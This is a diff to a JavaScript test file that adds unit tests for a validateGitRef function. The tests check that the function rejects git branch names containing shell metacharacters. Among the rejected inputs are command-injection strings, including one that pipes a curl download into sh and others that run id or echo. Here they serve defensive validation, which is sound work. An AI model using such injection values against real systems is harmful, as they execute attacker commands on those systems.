@@ -1,6 +1,6 @@
 import { describe, it } from "node:test";
 import assert from "node:assert/strict";
-import { escapeHashReferences } from "./platform.js";
+import { validateGitRef, escapeHashReferences } from "./platform.js";
 
 describe("escapeHashReferences", () => {
   it("escapes #N after space", () => {
@@ -78,5 +78,29 @@ describe("escapeHashReferences", () => {
       escapeHashReferences("fix #1 and #2 and #3"),
       "fix #\u200B1 and #\u200B2 and #\u200B3",
     );
+  });
+});
+
+describe("validateGitRef", () => {
+  it("accepts valid branch names", () => {
+    assert.equal(validateGitRef("main"), "main");
+    assert.equal(validateGitRef("feature/my-branch"), "feature/my-branch");
+    assert.equal(validateGitRef("release/v1.2.3"), "release/v1.2.3");
+    assert.equal(validateGitRef("fix_123"), "fix_123");
+  });
+  it("rejects branch names with shell metacharacters", () => {
+    assert.throws(() => validateGitRef("main$(curl x|sh)"), /Invalid git ref/);
+    assert.throws(() => validateGitRef("main;echo pwned"), /Invalid git ref/);
+    assert.throws(() => validateGitRef("main`id`"), /Invalid git ref/);
+    assert.throws(() => validateGitRef("main$(id)"), /Invalid git ref/);
+    assert.throws(() => validateGitRef("main|cat"), /Invalid git ref/);
+    assert.throws(() => validateGitRef("main&&echo"), /Invalid git ref/);
+    assert.throws(() => validateGitRef("$(echo hi)"), /Invalid git ref/);
+  });
+  it("rejects empty string", () => {
+    assert.throws(() => validateGitRef(""), /Invalid git ref/);
+  });
+  it("rejects names with spaces", () => {
+    assert.throws(() => validateGitRef("my branch"), /Invalid git ref/);
   });
 });
